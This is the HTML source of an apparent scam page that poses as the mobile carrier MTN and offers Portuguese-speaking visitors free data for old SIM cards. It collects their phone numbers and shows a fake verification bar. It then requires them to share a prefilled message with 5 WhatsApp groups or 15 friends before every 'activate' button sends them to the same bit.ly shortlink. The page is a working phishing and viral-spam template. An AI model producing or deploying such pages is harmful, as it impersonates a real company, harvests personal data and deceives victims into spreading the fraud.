...
<script>
  ...
  gtag('config', 'UA-180685151-1');
    ...
    <script>
        ...
        <title>MTN - RECOMPENSA DE DADOS GRATUITOS DO SIM ANTIGO</title>
        <link rel="shortcut icon" type="image/png" href="ii.jpeg" />
        <meta name="og:title" content="MTN - RECOMPENSA DE DADOS GRATUITOS DO SIM ANTIGO" />
        <meta property="og:description" content="MTN está oferecendo dados gratuitos para todos os cartões SIM antigos" />
...
.spin {
    ...
    border: solid 8px rgb(255, 202, 6);
...
.A{
  ...
  behavior="alternate"
  style="border:solid">
    <marquee behavior="alternate"> <font color="black">MTN - RECOMPENSA DE DADOS GRATUITOS DO SIM ANTIGO</font></marquee>
</marquee>
...
<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_t.js"></script><script type="text/javascript">sc_online_t(1708444,"","ffffff");</script><br><noscript><a href="https://www.supercounters.com/">supercounters.com</a></noscript>
</center>
<!-- END: Powered by Supercounters.com -->
                        ...
                        <div class="A">
                        <font color="white">  Prezado cliente, por favor, confirme seu número MTN para ativar seus dados gratuitos </font><br/> <b><font color="white">PRAZO FINAL:</font></b> <span class="blink"><b><font color="#010101">13 de abril</font></b> </span><font color="white">Digite seu número MTN abaixo e clique <b></b>VERIFICAR</b></font>
         </div>
    <div class="post" width="100%">
        ...
        <div id="intro">
            ...
            <p class="welcome">
                ...
                <center><input type="char" placeholder="Digite seu número MTN" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center><br/>
        ...
        <div id="loader">
            <div>Verificando seu número...</div>
            <div class="spin"></div>
            <div id="num">0%</div>
        </div>
        <div id="info">
           ...
           <center><p class="title"><font color="red">QUANTO TEMPO TEM O SEU CARTÃO SIM MTN</font></p></center>
          <center>
<select aria-label="الجنس" name="birthday_year" id="year" title="الجنس" class="_5dba" style="
    width: 330px;
    height: 56px;
">
<option value="أختر نوع الشبكة" selected="1">---Selecione aqui---</option>
  <option value="1">6 meses e acima - 5 GB  </option>
<option value="2"> 1 ano ou mais - 10 GB  </option>
<option value="2"> 5 anos ou mais - 50 GB  </option>
<option value="2"> Mais 10 anos - 100 GB  </option>
</select>
</center><br>

 
                  
          <button id="confirm">Prosseguir</button>
            </div>
            <p class="error">Desculpe, seu número está faltando <a href="https://offerforall.info/simcard-reward.com"> <b><font color="#14948F">ADICIONAR NÚMERO</font></b></a></p>
        </div>
        <div id="checking">
            <p class="title">Ativando Dados...</p>
            <div class="barr">
                <div class="fill">
                    <div id="fill"></div>
                </div>
        ...
        <div id="share">
            ...
            <p class="tip"> Parabéns, seu número MTN <span id="getname"></span>،</p>
            <p class="tip">
                está qualificado para receber oferta de dados grátis <span class="amount"> Prossiga para ativar seus dados gratuitos</span><br>
              Como proceder:
            </p><br>
            <p class="tip">1. Compartilhe com 5 grupos ou 15 amigos no WhatsApp (Clique no ícone "COMPARTILHAR" abaixo).</p>
            <p class="tip">2. Você será redirecionado automaticamente para nossa página "ATIVAÇÃO" após a barra de verificação VERDE ser preenchida.</p>
           

            <button id="whatsapp">COMPARTILHAR</button>
            <div class="barr">
                <div class="fill">
                    <div id="fill2"></div>
                </div>
        ...
        <div id="claim">
            ...
            <p class="title"> Clique em "ATIVAR" para ativar seus dados </p>
           <br/>
          <a  onclick="window.open('https://bit.ly/3W6qUJU')" href="https://bit.ly/3W6qUJU" >
                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="white">ATIVE 5 GB</font></button>
                    </a><br/>
          
       <a  onclick="window.open('https://bit.ly/3W6qUJU')" href="https://bit.ly/3W6qUJU" >
                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="white">ATIVE 10 GB</font></button>
                    </a>
             <br/>

            <a  onclick="window.open('https://bit.ly/3W6qUJU')" href="https://bit.ly/3W6qUJU" >
                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="white">ATIVE 50 GB</font></button>
                    </a>
             <br/>

            <a  onclick="window.open('https://bit.ly/3W6qUJU')" href="https://bit.ly/3W6qUJU" >
                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="white">ATIVAR ILIMITADO</font></button>
                    </a>
             <br/>
          
          
          <a  onclick="window.open('https://bit.ly/3W6qUJU')" href="https://bit.ly/3W6qUJU" >
                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="white">RELATÓRIO DE PROBLEMA</font></button>
                    </a><br/>
            <button id="offer">ATIVAR</button><br/>
...
<script>
     ...
     var text1 = "*PARABÉNS A TODOS OS CLIENTES DO CARTÃO SIM ANTIGO MTN*%0A%0AMTN está oferecendo dados gratuitos para todos os *CLIENTES*%0A%0A✅Sim com 6 meses - * 5 GB*%0A✅1 ano e acima - *10GB*%0A✅5 anos ou mais - *50GB*%0A✅Mais de 10 anos - *100 GB*%0A%0AApresse-se agora e verifique se o seu *MTN SIM CARD* é elegível para esta oferta%0A%0A_VERIFIQUE AQUI_👇%0Ahttps://offerforall.info/simcard-reward.com",
            text2 = " an amount of ",
